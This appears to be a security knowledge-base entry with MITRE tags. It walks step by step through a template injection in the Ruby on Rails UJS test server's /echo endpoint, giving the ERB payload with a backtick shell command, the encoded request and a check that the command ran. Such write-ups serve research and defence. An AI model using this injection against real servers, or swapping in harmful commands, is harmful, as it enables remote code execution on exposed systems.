---
tags:
  - ssti
  - rce
  - rails
  - ruby
  - web
type: attack_chain
tools:
  - '[[tools/git]]'
  - '[[tools/bundle]]'
  - '[[tools/rake]]'
  - '[[tools/Puma]]'
  - '[[tools/curl]]'
  - '[[tools/browser]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/git-clone-rails-repo]]'
  - '[[commands/cd-actionview]]'
  - '[[commands/git-rev-parse-head]]'
  - '[[commands/bundle-install]]'
  - '[[commands/rake-ujs-server]]'
  - '[[commands/encode-uri-component-payload]]'
  - '[[commands/ls-verify-file]]'
platforms:
  - Web
  - Linux
complexity: medium
procedures:
  - '[[procedures/Clone-Rails-Repository]]'
  - '[[procedures/Navigate-to-Actionview-Directory]]'
  - '[[procedures/Verify-Git-Commit-Hash]]'
  - '[[procedures/Install-Dependencies-with-Bundle]]'
  - '[[procedures/Start-UJS-Test-Server]]'
  - '[[procedures/Prepare-SSTI-Payload]]'
  - '[[procedures/Send-Exploit-Request]]'
  - '[[procedures/Verify-RCE-Exploitation]]'
step_count: 8
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
description: >-
  Exploitation of SSTI vulnerability in Rails UJS test server for remote code
  execution
skill_level: intermediate
impact_level: high
id: 541a467e-b90e-42eb-9196-992231bf7bf2
created_at: '2025-12-13T09:01:16.911Z'
updated_at: '2025-12-13T09:01:16.911Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# Server-Side Template Injection in Ruby on Rails UJS Test Server Leading to RCE

Multi-stage attack chain demonstrating the discovery and exploitation of an SSTI vulnerability in the Ruby on Rails UJS test server's /echo endpoint, leading to remote code execution via unsanitized user input rendered as ERB code. This affects development test environments and could be exploited externally if exposed.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 8 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Clone Repository] --> B[Navigate Directory]
    B --> C[Verify Commit]
    C --> D[Install Dependencies]
    D --> E[Start Server]
    E --> F[Prepare Payload]
    F --> G[Send Exploit]
    G --> H[Verify RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#e74c3c
    style F fill:#f39c12
    style G fill:#3498db
    style H fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/git]]
- [[tools/bundle]]
- [[tools/rake]]
- [[tools/Puma]]
- [[tools/curl]]
- [[tools/browser]]

### Target Environment

- Linux platform
- Ruby on Rails with ERB
- UJS test server running on port 4567
- Ruby 2.7.1, Puma 4.3.1

### Initial Access Requirements

- Access to the /echo endpoint
- Ability to send GET requests with parameters
- No credentials required for test server

## Detailed Attack Procedures

### Step 1: Clone the Rails Repository
procedure: [[procedures/Clone-Rails-Repository]]

**Objective**: Set up the local test environment by cloning the Rails repository.

**Instructions**: Use [[commands/git-clone-rails-repo]] to clone the repository:

```bash
git clone https://github.com/rails/rails.git
```

**Expected Output**: Repository cloned into a local directory.

**Success Indicators**:
- Repository directory created
- Git clone completes without errors

### Step 2: Navigate to Actionview Directory
procedure: [[procedures/Navigate-to-Actionview-Directory]]

**Objective**: Change to the relevant directory for further setup.

**Instructions**: Use [[commands/cd-actionview]] to navigate:

```bash
cd rails/actionview
```

**Expected Output**: Directory changed, no output.

**Success Indicators**:
- Current working directory is rails/actionview

### Step 3: Verify Git Commit Hash
procedure: [[procedures/Verify-Git-Commit-Hash]]

**Objective**: Confirm the version of the code being tested.

**Instructions**: Use [[commands/git-rev-parse-head]] to check the commit:

```bash
git rev-parse HEAD
```

**Expected Output**: A commit hash like 0fb6993f48bb01a960316027675f3f496baa2088.

**Success Indicators**:
- Commit hash matches expected version

### Step 4: Install Dependencies
procedure: [[procedures/Install-Dependencies-with-Bundle]]

**Objective**: Install required gems for the test server.

**Instructions**: Use [[commands/bundle-install]] to install:

```bash
bundle install
```

**Expected Output**: List of installed gems and dependencies.

**Success Indicators**:
- All dependencies installed successfully

### Step 5: Start UJS Test Server
procedure: [[procedures/Start-UJS-Test-Server]]

**Objective**: Launch the vulnerable test server.

**Instructions**: Use [[commands/rake-ujs-server]] to start the server:

```bash
rake ujs:server
```

**Expected Output**: Server startup messages, e.g., Puma starting... Listening on tcp://127.0.0.1:4567.

**Success Indicators**:
- Server running on port 4567
- No startup errors

### Step 6: Prepare SSTI Payload
procedure: [[procedures/Prepare-SSTI-Payload]]

**Objective**: Encode the ERB payload for injection.

**Instructions**: Use [[commands/encode-uri-component-payload]] to prepare the payload:

```bash
encodeURIComponent("<% `touch me` %>")
```

**Expected Output**: Encoded string like "%3C%25%20%60touch%20me%60%20%25%3E".

**Success Indicators**:
- Payload encoded correctly for URL use

### Step 7: Send Exploit Request
procedure: [[procedures/Send-Exploit-Request]]

**Objective**: Inject the payload into the /echo endpoint.

**Instructions**: Access the endpoint via browser or use curl with the encoded payload in the content parameter, e.g., http://127.0.0.1:4567/echo?content=%3C%25%20%60touch%20me%60%20%25%3E.

**Expected Output**: Response from server rendering the injected content.

**Success Indicators**:
- Request sent successfully
- No immediate errors in response

### Step 8: Verify RCE Exploitation
procedure: [[procedures/Verify-RCE-Exploitation]]

**Objective**: Confirm command execution by checking for created file.

**Instructions**: Use [[commands/ls-verify-file]] to check:

```bash
ls me
```

**Expected Output**: "me" if file exists.

**Success Indicators**:
- File 'me' is present, confirming RCE

## Attack Chain Summary

### Key Achievements

1. Local setup of vulnerable Rails test environment
2. Successful injection of ERB payload leading to command execution
3. Verification of RCE with file creation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: [TIMESTAMP]*
